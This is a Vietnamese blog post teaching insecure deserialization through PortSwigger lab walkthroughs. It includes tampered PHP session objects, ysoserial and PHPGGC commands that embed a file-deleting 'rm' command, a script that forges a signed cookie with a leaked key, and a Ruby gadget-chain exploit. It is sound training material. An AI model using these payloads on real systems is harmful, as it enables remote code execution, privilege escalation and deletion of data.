---
layout: single
title: "Insecure Deserialization - Lỗ hổng giải mã dữ liệu không an toàn"
date: 2026-04-09
classes: wide
categories: [Penetration Testing, web-security]
tags: [insecure-deserialization, java, php, serialization, portswigger, rce, gadget-chain]
---

# I. Lời mở đầu

Chắc hẳn khi học các loại ngôn ngữ lập trình như Java , PHP , …. có lẽ các bạn đã 1 lần nghe qua về Serialization và Deserialization . Đúng là nói về khái niệm thì đôi khi còn hơi mơ hồ thì trong bài viết về phần này chúng ta sẽ tìm hiểu về việc giải mã dữ liệu không an toàn cũng như các root cause và mô tả cách nó có thể khiến các trang web dễ bị tấn công nghiêm trọng như RCE nhé.

 

![image.png](/assets/images/insecure-deserialization/image.png)

Hình ảnh lấy từ Portswigger.net

## **1. Serialization và Deserialization**

Trước tiên thì trong quá trình lập trình ứng dụng , chúng ta có thể sử dụng nhìu loại ngôn ngữ , mà mỗi loại ngôn ngữ lại có đối tượng và cấu trúc dữ liệu đa dạng . Bởi vì với 1 lượng lớn quy tắc thông tin dữ liệu khác nhau và ko hề thống nhất như vậy sẽ khiến chúng ta khó khăn trong việc lưu trữ và truyền tải dữ liệu 1 cách dễ dàng và bảo mật. Đó là lí do serialization ra đời để giải quyết vấn đề thống nhất đó . 

Serialization là quá trình chuyển đổi các cấu trúc dữ liệu phúc tạp ,chẳng hạn như các đối tượng và các trường của chúng thành 1 định dạng "phẳng" hơn để có thể gửi và nhận dưới 1 luồng byte tuần tự . Dưới đây là 1 số lợi ích của việc sử dụng Serialization

- Lưu trữ dữ liệu : Một trong những lợi ích quan trọng nhất là cho phép lưu trữ trạng thái của dữ liệu để sử dụng sau này , cho phép chúng ta lưu dữ dưới dạng file hoặc cơ sở dữ liệu . Khi 1 ứng dụng đóng lại serialization có thể khôi phục lại trạng thái của dữ  liệu khi ứng dụng mở lại
- Truyền tải dữ liệu : Cho phép chuyển đổi dữ liệu thành 1 dạng có thể truyền tải qua mạng ,giữa các thành phần khác nhau trong ứng dụng hoặc trong lệnh gọi 1 API
- Tương tác giữa các ngôn ngữ lập trình khác nhau : Một ứng dụng viết bằng Java có thể được chuyển đối tượng thành 1 chuỗi byte và gửi nó đến 1 ứng dụng có thể được viết bằng C# hay Python
- Bảo mật dữ liệu : Khi dữ liệu được chuyển thành chuỗi byte  chúng ta có thể mã hóa nó để bảo mật dữ liệu

Ngược lại với Serialization là quá Deserialization là quá trình khôi phục dữ liệu từ chuỗi byte đó trở thành đối tượng hoặc cấu trúc dữ liệu gốc .

Bạn có thể tưởng tượng như bạn có 1 bộ lego đã sắp xếp rồi nhưng để chuyển qua cho bạn bè xài nhưng ko bị bể hay mất gì thì bạn sẽ tháo gỡ từng miếng lego ra thành những mảnh nhỏ và bỏ vào trong gói hoặc hộp nào đó .  Sau đó bạn của bạn sau khi nhận đc những mảnh nhỏ đó và có thể lắp lại thành 1 mẫu y như ban đầu.

## 2. Một số phương thức thực hiện Serialize - Deserialize

![image.png](/assets/images/insecure-deserialization/image%201.png)

Về bản chất thì quá trình tuần tự hóa hoặc giải tuần tử hóa là quá trình "phân mảnh-tái tổ chức". Một đối tượng nên ko có 1 quy tắc chung để thục hiện nó . Chúng có thể được chia thành 3 hình thức : Binary ,SOAP và XML .

- Binary Serialization chuyển dữ liệu thành chuỗi byte, giúp xử lý nhanh và hiệu quả về hiệu năng, nhưng lại kém tương thích giữa các nền tảng hoặc các phiên bản khác nhau.
- SOAP Serialization thường dùng trong web service, sử dụng XML để đóng gói dữ liệu và trao đổi giữa các ứng dụng thông qua request và response.
- XML Serialization chuyển đối tượng sang định dạng XML, giúp dữ liệu dễ đọc, dễ chia sẻ và có tính tương thích cao, nhưng thường chậm và phức tạp hơn so với Binary.
- Ngoài ra, lập trình viên có thể sử dụng Custom Serialization để tự định nghĩa cách chuyển đổi dữ liệu, cho phép kiểm soát chi tiết quá trình mã hóa và giải mã theo nhu cầu hệ thống.

.

## 3. **Lỗ hổng Insecure deserialization**

Lỗi giải mã dữ liệu không an toàn xảy ra khi dữ liệu do người dùng kiểm soát được giải mã bởi một trang web. Điều này tiềm ẩn nguy cơ cho phép các attacker thao túng các đối tượng đã được mã hóa để truyền dữ liệu độc hại vào mã ứng dụng. Thậm chí có thể dẫn tới RCE . Tấn công này cũng được gọi với 1 cái tên khác là Object injection 

# II. **Cách nhận biết quá trình giải mã dữ liệu không an toàn**

Việc xác định lỗ hổng này cũng tương đối đơn giản bất kể bạn đang Pentest trong trường hợp whitebox hoặc là blackbox. Trong quá trình kiểm thử bạn xem tất cả dữ liệu được truyền vào trang web và cố gắng xác định bất kỳ dữ liệu nào trông giống dữ liệu đang được Serialization. Về dạng dữ liệu này thì bạn có thể xác định khá dễ dàng nếu bạn biết được định dạng mà các ngôn ngữ đang sử dụng .

## 1. Định dạng tuần tự hóa trong PHP

PHP sử dụng định dạng chuỗi dễ đọc đối với con người, trong đó các chữ cái đại diện cho kiểu dữ liệu và các số đại diện cho độ dài của mỗi phần tử. Ví dụ, hãy xem xét một `User`đối tượng với các thuộc tính:

```
$user->name = "carlos";
$user->isLoggedIn = true;
```

Khi được tuần tự hóa, đối tượng này có thể trông giống như thế này:

```
O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}
```

Điều này có thể được hiểu như sau:

- `O:4:"User""User"`
    - Một đối tượng có tên lớp gồm 4 ký tự
- `2`
    - Đối tượng có 2 thuộc tính
- `s:4:"name""name"`
    - Khóa của thuộc tính đầu tiên là chuỗi 4 ký tự.
- `s:6:"carlos""carlos"`
    - Giá trị của thuộc tính đầu tiên là chuỗi 6 ký tự.
- `s:10:"isLoggedIn""isLoggedIn"`
    - Khóa của thuộc tính thứ hai là chuỗi 10 ký tự.
- `b:1true`
    - Giá trị của thuộc tính thứ hai là giá trị boolean.

Các phương thức gốc của PHP để tuần tự hóa dữ liệu là  `serialize()`và  `unserialize()`. Nếu bạn có quyền truy cập mã nguồn, bạn nên bắt đầu bằng cách tìm kiếm  `unserialize()`ở bất kỳ đâu trong mã và điều tra thêm.

### Định dạng tuần tự hóa trong Java

Một số ngôn ngữ như Java sử dụng cơ chế tuần tự hóa nhị phân (binary serialization). Điều này khiến dữ liệu khó đọc trực tiếp, tuy nhiên vẫn có thể nhận diện thông qua một số dấu hiệu đặc trưng:

- Luồng byte của object Java serialized thường bắt đầu bằng `ac ed` (hex)
- Hoặc có dạng `rO0` khi được encode Base64

Bất kỳ class nào implement interface `java.io.Serializable` đều có thể được serialize/deserialize. Khi phân tích mã nguồn, bạn nên đặc biệt chú ý tới phương thức `readObject()` — đây là điểm vào phổ biến cho các lỗ hổng deserialization.

### 2. Thao tác với dữ liệu đã được serialize

Việc khai thác lỗ hổng deserialization đôi khi rất đơn giản: chỉ cần thay đổi giá trị một thuộc tính trong object đã được serialize.

Do trạng thái object được lưu lại đầy đủ, attacker có thể:

- Phân tích dữ liệu serialize
- Xác định các thuộc tính quan trọng
- Chỉnh sửa giá trị
- Gửi lại object độc hại đến server

Có 2 cách tiếp cận chính:

1. **Chỉnh sửa trực tiếp trên byte stream**
2. **Viết code để tạo và serialize lại object mới** (cách này thường dễ hơn với binary format)

### a) Sửa đổi thuộc tính

Để có thể hình dung rõ hơn thì sau đây mình sẽ demo lại cách giải bài lab trên Portswigger.

![image.png](/assets/images/insecure-deserialization/image%202.png)

Lab này khai thác lỗ hổng **insecure deserialization** trong cơ chế session. Mục tiêu là chỉnh sửa object được serialize trong cookie để leo thang đặc quyền lên admin, sau đó xóa user `carlos`.

### Bước 1: Đăng nhập

Sử dụng tài khoản được cung cấp:

- Username: `wiener`
- Password: `peter`

Sau khi đăng nhập, quan sát request:

```
GET /my-account
```

 Bạn sẽ thấy một cookie `session` có dạng:

- URL encoded
- Base64 encoded

### Bước 2: Phân tích cookie

Dùng **Inspector trong Burp Suite** (Burp Suite) để decode cookie.

Sau khi decode, bạn sẽ thấy dạng:

```
O:4:"User":2:{s:8:"username";s:7:"wiener";s:5:"admin";b:0;}
```

 Nhận xét:

- Đây là **PHP serialized object**
- Thuộc tính `admin` = `b:0` (false)

### Bước 3: Chỉnh sửa object

Gửi request sang **Repeater**, sau đó:

- Sửa:

```
-b:0;
+b:1;
```

Object sau khi sửa:

```
O:4:"User":2:{s:8:"username";s:7:"wiener";s:5:"admin";b:1;}
```

![image.png](/assets/images/insecure-deserialization/image%203.png)

- Nhấn **Apply changes** và gửi request đã chỉnh sửa 
Cuối cùng là truy cập vào admin và xóa tài khoản Carlos để hoàn thành bài lab

Lỗi nằm ở việc server:

- Tin tưởng dữ liệu từ cookie (client-controlled)
- Dùng `unserialize()` trực tiếp mà không kiểm tra
- Không có:
    - ký số (signature)
    - mã hóa (encryption)
    - validate dữ liệu

Điều này cho phép attacker:

- Tùy ý chỉnh sửa object
- Leo thang đặc quyền

### b) Sửa đổi kiểu dữ liệu trong object đã serialize

Ngoài việc thay đổi giá trị thuộc tính, attacker còn có thể thay đổi **kiểu dữ liệu** của thuộc tính đó. Đây là một kỹ thuật khá nguy hiểm, đặc biệt trong các ứng dụng viết bằng PHP do cơ chế so sánh lỏng lẻo (`==`).

Trong PHP, khi so sánh hai giá trị khác kiểu, hệ thống sẽ tự động ép kiểu. Ví dụ:

- `5 == "5"` → `true`
- `5 == "5abc"` → `true` (chuỗi được ép thành số 5)
- Trên PHP 7.x: `0 == "anything"` → `true`

Điều này dẫn đến các lỗi logic nếu dữ liệu so sánh đến từ nguồn không đáng tin, chẳng hạn như object được deserialize từ cookie.

Xét đoạn code:

```
$login = unserialize($_COOKIE);
if ($login['password'] == $password) {
    // đăng nhập thành công
}
```

Nếu attacker sửa `password` trong object thành số nguyên `0`, thì:

- Miễn là `$password` thực tế không bắt đầu bằng số
- Điều kiện so sánh vẫn có thể trả về `true`

Lý do là vì quá trình deserialize **giữ nguyên kiểu dữ liệu**, trong khi input thông thường từ request sẽ luôn là string.

Lưu ý:

- Trên PHP 8+, `0 == "abc"` đã không còn đúng nữa
- Tuy nhiên các trường hợp như `"5abc"` vẫn bị ép về `5`

Một điểm quan trọng khi chỉnh sửa object:

- Phải cập nhật đúng **kiểu dữ liệu** (`s`, `i`, `b`, …)
- Và **độ dài chuỗi**
Nếu không, object sẽ bị lỗi và không deserialize được.

## 

![image.png](/assets/images/insecure-deserialization/image%204.png)

Lab này vẫn sử dụng session dựa trên serialization, nhưng thay vì leo thang đặc quyền bằng boolean, ta sẽ **bypass xác thực bằng cách thay đổi kiểu dữ liệu**.

### Bước 1: Đăng nhập

Sử dụng tài khoản:

- `wiener:peter`

Sau khi đăng nhập, bắt request:

```
GET /my-account
```

Quan sát cookie `session`, decode bằng Inspector trong Burp Suite sẽ thấy object PHP serialized.

### Bước 2: Gửi sang Repeater

Send request sang Repeater để chỉnh sửa.

![image.png](/assets/images/insecure-deserialization/image%205.png)

### Bước 3: Chỉnh sửa object

Giả sử object ban đầu có dạng:

```
O:4:"User":2:{
    s:8:"username";s:7:"wiener";
    s:12:"access_token";s:32:"random_token_here";
}
```

Ta sẽ thực hiện các thay đổi:

1. Đổi username thành `administrator`
2. Cập nhật độ dài chuỗi username → `13`
3. Thay `access_token` từ string → integer `0`
4. Đổi kiểu dữ liệu từ `s` → `i`
5. Xóa dấu ngoặc kép quanh giá trị `0`

Kết quả:

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

### 

![image.png](/assets/images/insecure-deserialization/image%206.png)

Và sau khi gửi request thì t có thể truy cập vào admin panel và có thể xóa tài khoản Carlos

![image.png](/assets/images/insecure-deserialization/image%207.png)

### c) Khai thác thông qua chức năng của ứng dụng

Trong nhiều trường hợp, ứng dụng không chỉ đọc giá trị từ object được deserialize mà còn **thực hiện hành động dựa trên dữ liệu đó**. Đây là lúc lỗ hổng trở nên nguy hiểm hơn.

Ví dụ, một chức năng "xóa người dùng" có thể xóa luôn file ảnh đại diện dựa vào thuộc tính:

```
$user->image_location
```

Nếu `$user` được tạo từ dữ liệu deserialize không an toàn, attacker hoàn toàn có thể:

- Thay đổi `image_location`
- Trỏ đến một file tùy ý trên hệ thống
- Khi chức năng xóa user chạy → file đó cũng bị xóa theo

Đây là dạng **abuse business logic thông qua deserialization**, không cần RCE vẫn gây impact lớn (xóa file, ghi đè file, …).

## 

![image.png](/assets/images/insecure-deserialization/image%208.png)

Lab này khai thác đúng ý tưởng trên: lợi dụng chức năng có sẵn của hệ thống để thực hiện hành động ngoài ý muốn.

Mục tiêu:

- Xóa file `/home/carlos/morale.txt`

Dùng tài khoản:

- `wiener:peter`

Sau khi đăng nhập, vào trang **My account**

Bước 2 : 

Trang có chức năng:

```
POST /my-account/delete
```

Đây là điểm quan trọng: khi xóa account, hệ thống sẽ xử lý thêm các dữ liệu liên quan (như avatar).

Bắt request và gửi sang Repeater, sau đó dùng Inspector trong Burp Suite để decode.

Bạn sẽ thấy object dạng:

```
O:4:"User":3:{
    s:8:"username";s:7:"wiener";
    s:11:"avatar_link";s:...":"/path/to/avatar";
    ...
}
```

 Thuộc tính `avatar_link` chính là thứ ta cần.

### Bước 4: Chỉnh sửa đường dẫn file

Thay giá trị `avatar_link` thành:

```
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
```

Lưu ý:

- Phải cập nhật đúng độ dài (`23`)
- Nếu sai → object sẽ bị lỗi deserialize

![image.png](/assets/images/insecure-deserialization/image%209.png)

Đổi request thành:

```
POST /my-account/delete
```

Sau đó gửi đi.

### Kết quả

- Account của bạn bị xóa
- Đồng thời file `/home/carlos/morale.txt` cũng bị xóa

Sau khi đi qua 1 vài bước tấn công cơ bản thì các bạn có thể cũng hiểu sơ về các hoạt động nhưng về hiện tại thì các trang web cũng ko dễ dàng cho chúng ta có quyền làm như vậy. Thì để nâng cao hơn các kĩ thuật tấn công thì sau đây mình sẽ giới thiệu cho các bạn 1 vũ khí gọi là "Magic method"

## 3. Magic method và vai trò trong deserialization

Magic method (phương thức ma thuật) là các phương thức đặc biệt trong lập trình hướng đối tượng (PHP, Python...) tự động được gọi khi một sự kiện cụ thể xảy ra với đối tượng. Chúng giúp tùy biến hành vi đối tượng, nạp chồng toán tử, và thường có tên bắt đầu bằng hai dấu gạch dưới như `__construct` (PHP) hoặc `__init__` (Python)

. Trong PHP, các method này thường có dạng `__methodName()` như:

- `__construct()` → gọi khi object được khởi tạo
- `__wakeup()` → gọi khi deserialize
- `__destruct()` → gọi khi object bị hủy

Bản thân magic method không phải là lỗ hổng. Chúng được sử dụng rất phổ biến để xử lý logic nội bộ của class. Tuy nhiên, vấn đề xuất hiện khi:

- Dữ liệu truyền vào object đến từ nguồn không tin cậy (ví dụ: cookie)
- Object được tạo thông qua `unserialize()`

Trong trường hợp này, attacker có thể **điều khiển dữ liệu đi vào magic method**, và vì các method này được gọi tự động, code bên trong sẽ được thực thi mà không cần gọi trực tiếp.

Đặc biệt quan trọng:

- `__wakeup()` chạy ngay khi deserialize
- `__destruct()` chạy khi object kết thúc vòng đời (thường là cuối request)

Điều này biến quá trình deserialization thành một điểm kích hoạt thực thi code.

### Magic method trong Java

Trong Java, cơ chế tương tự tồn tại với:

- `readObject()` trong `ObjectInputStream`

Nếu một class tự định nghĩa:

```
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
// implementation
}
```

Thì method này sẽ được gọi tự động trong quá trình deserialize, đóng vai trò tương tự magic method.

### Injecting arbitrary objects (chèn object tùy ý)

Ở các lab trước, ta chỉ sửa object có sẵn. Nhưng trong thực tế, attacker có thể đi xa hơn: **tạo hoàn toàn một object mới thuộc class khác**.

Lý do là:

- `unserialize()` thường **không kiểm tra class**
- Miễn là class tồn tại trên server → object sẽ được tạo

Điều này mở ra khả năng:

- Chọn class có magic method nguy hiểm
- Inject object của class đó
- Trigger hành vi độc hại

Ngay cả khi ứng dụng không mong đợi class đó, object vẫn được khởi tạo trước khi logic phía sau phát hiện lỗi.

## Lab: Arbitrary Object Injection in PHP

![image.png](/assets/images/insecure-deserialization/image%2010.png)

Lab này là bước tiến rõ ràng: không còn chỉnh sửa object cũ nữa, mà tự tạo object mới để khai thác magic method.

Mục tiêu vẫn là xóa file:

```
/home/carlos/morale.txt
```

---

Sau khi đăng nhập bằng `wiener:peter`, quan sát session cookie sẽ thấy object được serialize.

Tiếp theo, từ sitemap của ứng dụng, có thể tìm thấy file:

```
/libs/CustomTemplate.php
```

Một trick khá quen thuộc là thêm dấu `~` vào cuối tên file để đọc file backup do editor tạo:

```
/libs/CustomTemplate.php~
```

Khi xem source code, có thể thấy class `CustomTemplate` chứa:

![image.png](/assets/images/insecure-deserialization/image%2011.png)

```
function __destruct() {
    unlink($this->lock_file_path);
}

```

Đây chính là sink nguy hiểm:

- `unlink()` sẽ xóa file
- Đường dẫn file lấy từ thuộc tính `lock_file_path`

Nếu kiểm soát được thuộc tính này, ta có thể xóa bất kỳ file nào.

Thay vì sửa object cũ, ta tạo một object mới hoàn toàn:

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Ý nghĩa:

- `O:14:"CustomTemplate"` → class name
- `1` → số thuộc tính
- `lock_file_path` → thuộc tính cần điều khiển
- Giá trị → đường dẫn file cần xóa

Khi request được gửi đi:

- Server sẽ `unserialize()`
- Object `CustomTemplate` được tạo
- Khi request kết thúc → `__destruct()` tự động chạy

### Phân tích

![image.png](/assets/images/insecure-deserialization/image%2012.png)

Điểm quan trọng ở đây:

- Không cần gọi function trực tiếp
- Không cần endpoint đặc biệt
- Chỉ cần deserialize → magic method tự chạy

Đây chính là nền tảng của các attack phức tạp hơn như:

- Gadget chain (chuỗi các method gọi lẫn nhau)
- Remote Code Execution (RCE)

Tiếp theo chúng ta đến tới phần gadget chain , bạn tưởng tính khi sắp xếp lego ,bạn có những mảnh nhỏ ,nếu bạn tìm tòi và gắp chúng lại với nhau thì sẽ ra một mô hình hoàn thiện rất là đẹp . Vậy tưởng tượng là chúng ta ứng dụng trong các lỗ hổng tấn công , thì bạn cũng đã nghe qua exploit chain , nó cũng tương tự như vậy .Thay vì chỉ khai thác một lỗi đơn lẻ (thường có tác động thấp), tin tặc sẽ "xâu chuỗi" chúng lại theo thứ tự để đạt được mục tiêu cuối cùng, chẳng hạn như chiếm quyền điều khiển toàn bộ hệ thống

## III. Gadget chain là gì và tại sao lại quan trọng?

### Gadget chain

Trong bối cảnh deserialization, một "gadget" có thể hiểu là một đoạn code có sẵn trong ứng dụng mà attacker có thể tận dụng để phục vụ cho mục đích của mình. Bản thân từng gadget riêng lẻ thường không gây hại trực tiếp. Tuy nhiên, attacker có thể nối nhiều gadget lại với nhau để tạo thành một chuỗi xử lý dữ liệu, gọi là **gadget chain**.

Ý tưởng chính là: dữ liệu do attacker kiểm soát sẽ được truyền qua nhiều method khác nhau, từ gadget này sang gadget khác, cho đến khi chạm tới một "sink" nguy hiểm như thực thi lệnh hệ thống, thao tác file, hoặc gọi các hàm nhạy cảm. Mỗi gadget đóng vai trò như một bước trung gian trong quá trình này.

Điểm quan trọng cần hiểu là gadget chain không phải là đoạn code do attacker tự viết ra. Toàn bộ các method đã tồn tại sẵn trong ứng dụng hoặc thư viện. Attacker chỉ kiểm soát dữ liệu đầu vào để "dẫn" luồng thực thi đi qua các đoạn code này.

Thông thường, việc kích hoạt gadget chain bắt đầu từ một magic method được gọi trong quá trình deserialization, chẳng hạn như `__wakeup()` hoặc `__destruct()` trong PHP. Những method này đóng vai trò như điểm khởi động (kick-off), từ đó kích hoạt các lời gọi method tiếp theo trong chuỗi.

Trong thực tế, phần lớn các lỗ hổng insecure deserialization chỉ có thể khai thác được khi xây dựng được gadget chain phù hợp. Đôi khi chain rất đơn giản, chỉ gồm một hoặc hai bước. Nhưng với các khai thác nghiêm trọng như RCE, thường cần một chuỗi phức tạp hơn, bao gồm nhiều object và nhiều lần gọi method liên tiếp.

## Làm việc với gadget chain có sẵn

Việc tự tìm gadget chain bằng tay là một quá trình khá tốn thời gian, đặc biệt khi không có source code. Bạn phải lần theo luồng dữ liệu qua từng class, từng method, điều này gần như không khả thi với các ứng dụng lớn.

May mắn là có nhiều tool cung cấp sẵn các gadget chain đã được nghiên cứu từ trước. Điều này khả thi vì rất nhiều ứng dụng sử dụng chung các thư viện. Nếu một gadget chain trong một thư viện có thể bị khai thác ở một hệ thống, thì những hệ thống khác dùng cùng thư viện đó cũng có khả năng bị ảnh hưởng.

### ysoserial

Trong hệ sinh thái Java, một tool rất phổ biến là ysoserial.

Cách hoạt động khá đơn giản: bạn chọn một gadget chain tương ứng với thư viện mà bạn đoán ứng dụng đang sử dụng, sau đó truyền vào command mà bạn muốn thực thi. Tool sẽ tự động tạo ra một object đã được serialize chứa đầy đủ gadget chain đó.

Ví dụ:

```
java -jar ysoserial-all.jar CommonsCollections1 "id"
```

Kết quả trả về là một payload đã được serialize. Khi gửi payload này tới server (nơi có lỗ hổng deserialization), gadget chain sẽ được kích hoạt và thực thi command tương ứng.

Dù vẫn cần thử nghiệm để đoán đúng thư viện và chain phù hợp, nhưng cách này nhanh hơn rất nhiều so với việc tự xây dựng gadget chain từ đầu.

Với các phiên bản Java mới (từ 16 trở lên), cần thêm một số tham số để mở quyền truy cập vào các module nội bộ trước khi chạy tool:

```
java -jar ysoserial-all.jar \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
[payload] '[command]'
```

---

Đoạn này bạn có thể xem như bước chuyển từ "hiểu lỗ hổng" sang "khai thác thực chiến". Nếu viết tiếp, phần hợp lý nhất là demo một gadget chain cụ thể (ví dụ CommonsCollections) hoặc so sánh cách khai thác giữa PHP và Java.

### Lab: Exploiting Java deserialization với Apache Commons

![image.png](/assets/images/insecure-deserialization/image%2013.png)

Lab này sử dụng session dựa trên serialization và có load thư viện Apache Commons Collections. Dù không có source code, vẫn có thể exploit bằng gadget chain có sẵn.

Đầu tiên login bằng account `wiener:peter`, sau đó quan sát cookie session. Bạn sẽ thấy giá trị cookie là một chuỗi dài (thường là Base64) → đây chính là object đã được serialize trong Java.

Gửi request chứa cookie này sang Burp Repeater để tiện chỉnh sửa và replay.

Tiếp theo, sử dụng tool ysoserial để tạo payload. Vì lab dùng Apache Commons Collections nên chọn gadget chain tương ứng (ví dụ CommonsCollections4).

Nếu dùng Java 16+, chạy:

```
java -jar ysoserial-all.jar \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

Nếu Java <= 15 thì đơn giản hơn:

```
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

![image.png](/assets/images/insecure-deserialization/image%2014.png)

Lệnh này sẽ tạo ra một serialized object chứa gadget chain + command thực thi (`rm /home/carlos/morale.txt`).

Copy kết quả Base64 này, quay lại Burp Repeater, thay thế giá trị session cookie cũ bằng payload mới. Sau đó URL-encode toàn bộ cookie (rất quan trọng vì cookie phải hợp lệ khi gửi request HTTP).

Cuối cùng gửi request. Khi server deserialize object này, gadget chain sẽ được kích hoạt và dẫn tới thực thi command trên server → file `morale.txt` trong home của carlos bị xóa → lab được solve.

![image.png](/assets/images/insecure-deserialization/image%2015.png)

Sau khi gửi xong thì server respone mã lỗi 500 với ném ra ngoại lệ như ảnh 

Cơ chế diễn ra bên trong hệ thống như sau:

1. **Giai đoạn thực thi:** Khi bạn gửi Cookie chứa Payload, server gọi hàm giải mã. Ngay trong quá trình giải mã, chuỗi Gadget "ép" Java thực thi lệnh `rm /home/carlos/morale.txt`. File đã bị xóa thành công ngay tại thời điểm này.
2. **Giai đoạn báo lỗi:** Sau khi thực thi lệnh xong, máy chủ Java cố gắng đưa đối tượng vừa giải mã về kiểu dữ liệu ban đầu (ví dụ: `UserSession`). Vì Payload của mình là một chuỗi độc hại chứ không phải một đối tượng User hợp lệ, nên nó ném ra ngoại lệ `InstantiateTransformer: Constructor threw an exception`.

## Làm việc với gadget chain đã được công bố

![image.png](/assets/images/insecure-deserialization/image%2016.png)

Không phải tất cả gadget chain trong ysoserial đều dùng để thực thi lệnh. Một số chain được thiết kế chỉ để **detect deserialization**.

Ví dụ phổ biến là:

- URLDNS: khi deserialize sẽ trigger một DNS lookup tới domain attacker cung cấp. Ưu điểm là không phụ thuộc thư viện cụ thể và hoạt động trên hầu hết các phiên bản Java. Nếu bạn thấy server có request DNS về Burp Collaborator → chắc chắn có deserialize xảy ra.
- JRMPClient: khiến server cố gắng mở kết nối TCP tới một IP. Dùng trong trường hợp outbound DNS bị chặn. Có thể detect bằng timing (IP nội bộ phản hồi nhanh, IP ngoài bị firewall → delay).

=> Ý chính: chưa cần RCE, chỉ cần chứng minh "có deserialize" là đã có vuln.

---

### Lab: PHP insecure deserialization với signed cookie

![image.png](/assets/images/insecure-deserialization/image%2017.png)

Lab này khó hơn vì có thêm lớp **ký (signature)** bảo vệ cookie.

Đầu tiên login `wiener:peter`, gửi request sang Burp Repeater, nhìn cookie trong Inspector sẽ thấy:

- cookie dạng JSON
- có `token` (Base64)
- có `sig_hmac_sha1` → chữ ký HMAC-SHA1

Decode Base64 phần token sẽ thấy đây là object serialize của PHP.

![image.png](/assets/images/insecure-deserialization/image%2018.png)

Thử sửa cookie rồi gửi lại sẽ bị lỗi → vì signature không khớp. Nghĩa là muốn exploit phải **ký lại cookie hợp lệ**.

Quan sát response sẽ thấy 2 hint quan trọng:

- có comment dev trỏ tới `/cgi-bin/phpinfo.php`
- lộ framework là Symfony 4.3.6

![image.png](/assets/images/insecure-deserialization/image%2019.png)

![image.png](/assets/images/insecure-deserialization/image%2020.png)

Truy cập `/cgi-bin/phpinfo.php` sẽ leak thông tin cấu hình, trong đó có biến môi trường `SECRET_KEY`. Đây chính là key dùng để ký cookie.

![image.png](/assets/images/insecure-deserialization/image%2021.png)

### Tạo payload bằng gadget chain có sẵn

Vì target dùng Symfony → dùng tool PHPGGC:

```
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```

Payload này là một object serialize chứa gadget chain của Symfony, khi deserialize sẽ dẫn tới RCE.

![image.png](/assets/images/insecure-deserialization/image%2022.png)

### Ký lại cookie

Giờ phải tạo cookie hợp lệ:

- `token` = payload vừa tạo
- `sig_hmac_sha1` = HMAC-SHA1(token, SECRET_KEY)

Dùng script PHP:

```php
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY";

$cookie = urlencode('{"token":"'.$object.'","sig_hmac_sha1":"'.hash_hmac('sha1',$object,$secretKey).'"}');
echo $cookie;
```

Script này sẽ tạo ra cookie hợp lệ (đã ký đúng).

![image.png](/assets/images/insecure-deserialization/image%2023.png)

### Gửi exploit

Quay lại Burp Repeater:

- replace cookie cũ bằng cookie mới
- gửi request

Server sẽ:

- verify signature (ok vì đúng key)
- deserialize object → trigger gadget chain → thực thi command
- file `/home/carlos/morale.txt` bị xóa → solve lab

![image.png](/assets/images/insecure-deserialization/image%2024.png)

![image.png](/assets/images/insecure-deserialization/image%2025.png)

Sau khi gửi request xong thì tôi thấy server bị báo lỗi 500 , thường thì khi báo lỗi 500 thì dấu hiệu đã báo răng payload đã chạy rồi và khi mở lên thì đã solve được lab

![image.png](/assets/images/insecure-deserialization/image%2026.png)

### Insight quan trọng

Điểm mấu chốt của lab này không phải là gadget chain, mà là:

- deserialize dữ liệu user kiểm soát
- có cơ chế ký nhưng key bị lộ

=> kể cả khi dev đã "bảo vệ" bằng signature, chỉ cần lộ key là toàn bộ cơ chế đó vô dụng.

## Làm việc với gadget chain đã được công bố

Không phải lúc nào cũng có tool như ysoserial hay PHPGGC cho framework bạn đang gặp. Trong nhiều trường hợp, bạn sẽ phải tự tìm các exploit đã được công bố trên internet rồi chỉnh sửa lại cho phù hợp.

Ý tưởng vẫn giống nhau: người khác đã phân tích sẵn gadget chain trong framework, bạn chỉ cần:

- hiểu sơ cách payload hoạt động
- sửa command theo mục tiêu của bạn
- serialize lại đúng format mà ứng dụng sử dụng

Cách này vẫn nhanh hơn rất nhiều so với việc tự build gadget chain từ đầu.

### Lab: Exploiting Ruby deserialization (Ruby on Rails)

![image.png](/assets/images/insecure-deserialization/image%2027.png)

Login với `wiener:peter`, sau đó quan sát cookie session. Bạn sẽ thấy cookie là một chuỗi Base64 → decode ra sẽ là object được marshal (serialize) của Ruby.

![image.png](/assets/images/insecure-deserialization/image%2028.png)

Gửi request sang Burp Repeater để tiện chỉnh sửa.

Vì lab dùng Ruby on Rails, không có tool "1-click" như Java/PHP, nên phải tìm gadget chain có sẵn. Một chain khá nổi tiếng là:

- **Universal Deserialization Gadget for Ruby 2.x–3.x** (by vakzz)

Copy script exploit ở trang này về.

https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

### Chỉnh sửa payload

Trong script:

- đổi command từ `id` → `rm /home/carlos/morale.txt`
- sửa phần output để in ra Base64:

```
puts Base64.encode64(payload)
```

Mục tiêu là tạo payload đúng format giống cookie của ứng dụng.

Chạy script → sẽ thu được một object đã serialize và encode Base64.

![image.png](/assets/images/insecure-deserialization/image%2029.png)

### Gửi exploit

Quay lại Burp Repeater:

- thay cookie cũ bằng payload vừa tạo
- URL-encode lại toàn bộ cookie

Gửi request.

![image.png](/assets/images/insecure-deserialization/image%2030.png)

